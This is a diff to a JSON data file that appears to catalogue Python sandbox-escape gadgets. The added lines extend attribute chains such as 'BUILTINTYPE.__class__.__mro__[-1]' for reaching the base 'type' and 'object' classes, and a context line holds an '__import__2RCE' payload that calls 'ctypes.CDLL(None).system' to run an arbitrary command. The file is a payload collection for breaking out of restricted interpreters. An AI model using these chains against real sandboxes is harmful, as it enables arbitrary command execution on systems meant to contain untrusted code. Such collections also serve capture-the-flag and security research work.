@@ -135,6 +135,7 @@
     ],
     "type": [
         ["BUILTINOBJ.__class__.__class__",""],
+        ["BUILTINTYPE.__class__",""],
         ["type(USER_DEFINED_CLASS).__class__","type,USER_DEFINED_CLASS"]
     ],
     "restore_builtins_in_other_ns":[
@@ -150,7 +151,10 @@
     "object":[
         ["BUILTINOBJ.__class__.__bases__[0]",""],
         ["BUILTINOBJ.__class__.__mro__[-1]",""],
-        ["BUILTINOBJ.__class__.__mro__[1]",""]
+        ["BUILTINOBJ.__class__.__mro__[1]",""],
+        ["BUILTINTYPE.__class__.__bases__[0]",""],
+        ["BUILTINTYPE.__class__.__mro__[-1]",""],
+        ["BUILTINTYPE.__class__.__mro__[1]",""]
     ],
     "__import__2RCE":[
         ["ctypes.CDLL(None).system(COMMAND.encode())","ctypes"],
